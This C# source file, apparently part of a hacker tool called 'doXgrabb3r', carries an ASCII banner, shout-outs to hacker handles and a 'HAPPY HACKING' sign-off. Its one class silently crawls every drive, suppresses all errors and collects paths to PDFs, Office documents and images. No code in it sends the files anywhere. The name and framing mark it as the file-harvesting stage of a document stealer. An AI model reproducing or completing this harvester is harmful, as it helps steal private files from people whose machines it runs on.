
using System;
using System.Collections.Generic;
using System.IO;

/*

    .___    ____  ___                   ___.  ___.   ________        
  __| _/____\   \/  /  ________________ \_ |__\_ |__ \_____  \______ 
 / __ |/  _ \\     /  / ___\_  __ \__  \ | __ \| __ \  _(__  <_  __ \
/ /_/ (  <_> )     \ / /_/  >  | \// __ \| \_\ \ \_\ \/       \  | \/
\____ |\____/___/\  \\___  /|__|  (____  /___  /___  /______  /__|   
     \/           \_/_____/            \/    \/    \/       \/       

*/

//
// <author>
//     <value>Jahanzaib Khan Durrani</value>
// </author>
//
// <CyberName>
//     <value>MAGniFic0</value>
//     <value>...</value>
// </CyberName>
//
// <greetings>
//     <value>Mr. P.Teo</value>
//     <value>VirKid36</value>
//     <value>Mr. Exploit</value>
//     <value>X HaxOr</value>
//     <value>Mr. Anon</value>
//     <value>Code Breaker</value>
//     <value>5IL3NT H4CK3R</value>
//     <value>HaxOr Hees</value>
// </greetings>
//
// <fucksTo>
//     <value>Idea Stealer 1</value>
//     <value>Idea Stealer 2</value>
//     <value>Idea Stealer 3</value>
//     <desc>PM IF YOU WANT THE NAMES. Yes, Yes, You know them as 1337s ;)</desc>
// </fucksTo>
//
// For signing the assembly refer to :
// https://msdn.microsoft.com/en-us/library/6f05ezxy(v=vs.110).aspx 
//
/*           HAPPY HACKING :)            */


namespace doXgrabb3r {
 class FileArrayBuilder {

  List < string > AllFilePaths = new List < string > ();
  List < string > RequiredFilePaths = new List < string > ();

  private void DirSearch(string sDir) {
   try {
    foreach(string d in Directory.GetDirectories(sDir)) {
     try {
      foreach(string f in Directory.GetFiles(d)) {
       AllFilePaths.Add(f);
      }
     } catch (Exception @e) { /*Console.WriteLine(e.Message);*/ }
     DirSearch(d);
    }
   } catch (Exception @e) { /*Console.WriteLine(e.Message);*/ }
  }

  public List < string > Search() {

   foreach(DriveInfo d in DriveInfo.GetDrives()) {
    try {
     DirSearch(d.RootDirectory.FullName);
    } catch (Exception e) {
     /*Console.WriteLine(e.Message);*/ // Log it and move on
    }


   }

   filter_Paths();

   return RequiredFilePaths;
  }

  private void filter_Paths() {

   foreach(string path in AllFilePaths) {

    if (Path.GetExtension(path).ToLower().Equals(".pdf") || Path.GetExtension(path).ToLower().Equals(".doc") || Path.GetExtension(path).ToLower().Equals(".docx") || Path.GetExtension(path).ToLower().Equals(".xls") || Path.GetExtension(path).ToLower().Equals(".xlsx") || Path.GetExtension(path).ToLower().Equals(".ppt") || Path.GetExtension(path).ToLower().Equals(".pptx") || Path.GetExtension(path).ToLower().Equals(".jpg") || Path.GetExtension(path).ToLower().Equals(".png")) {
     RequiredFilePaths.Add(path);

    }
   }

  }

  public void clear_ram() {
   AllFilePaths = null;
   RequiredFilePaths = null;
  }

 }


}
